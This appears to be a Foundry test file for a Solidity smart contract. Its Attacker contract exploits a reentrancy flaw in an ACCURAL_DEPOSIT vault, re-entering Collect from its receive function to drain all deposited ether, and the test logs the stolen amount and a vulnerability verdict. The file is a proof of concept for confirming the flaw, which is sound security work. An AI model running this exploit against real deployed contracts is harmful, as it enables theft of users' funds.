// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol";

contract Attacker {
    ACCURAL_DEPOSIT public vault;
    uint public reentrancyCount;

    constructor(address payable _vault) payable {
        vault = ACCURAL_DEPOSIT(_vault);
    }

    function deposit() public payable {
        vault.Deposit{value: msg.value}();
    }

    function startAttack() public {
        vault.Collect(0.5 ether);
    }

    receive() external payable {
        if (reentrancyCount < 1) {
            reentrancyCount++;
            vault.Collect(0.5 ether);
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyTest is Test {
    ACCURAL_DEPOSIT public vault;
    LogFile public logContract;
    Attacker public attacker;

    function setUp() public {
        // Deploy contracts
        logContract = new LogFile();
        vault = new ACCURAL_DEPOSIT();
        
        // Initial setup
        vault.SetLogFile(address(logContract));
        vault.SetMinSum(0);

        // Deploy attacker contract with funds
        attacker = new Attacker{value: 1 ether}(payable(address(vault)));
        
        // Attacker deposits 1 ether
        attacker.deposit{value: 1 ether}();
    }

    function testReentrancy() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialAttackerBalance = address(attacker).balance;
        uint256 initialVaultBalance = address(vault).balance;
        uint256 initialAttackerVaultBalance = vault.balances(address(attacker));
        
        console.log("Vault ETH Balance:", initialVaultBalance);
        console.log("Attacker's Balance in Vault:", initialAttackerVaultBalance);
        console.log("Attacker's ETH Balance:", initialAttackerBalance);

        console.log("--- Trigger Attack ---");
        attacker.startAttack();

        console.log("--- AFTER-Trigger State ---");
        uint256 finalVaultBalance = address(vault).balance;
        uint256 finalAttackerVaultBalance = vault.balances(address(attacker));
        uint256 finalAttackerBalance = address(attacker).balance;
        uint256 stolenAmount = finalAttackerBalance - initialAttackerBalance;

        console.log("Vault ETH Balance:", finalVaultBalance);
        console.log("Attacker's Balance in Vault:", finalAttackerVaultBalance);
        console.log("Attacker's ETH Balance:", finalAttackerBalance);
        console.log("Reentrancy Count:", attacker.reentrancyCount());
        console.log("Stolen Amount:", stolenAmount);

        bool vulnerabilityExists = 
            finalVaultBalance == 0 && 
            stolenAmount == 1 ether &&
            finalAttackerVaultBalance == 0 &&
            attacker.reentrancyCount() == 1;

        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Reentrancy attack was successful and vault drained");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack did not succeed as expected");
        }
    }
}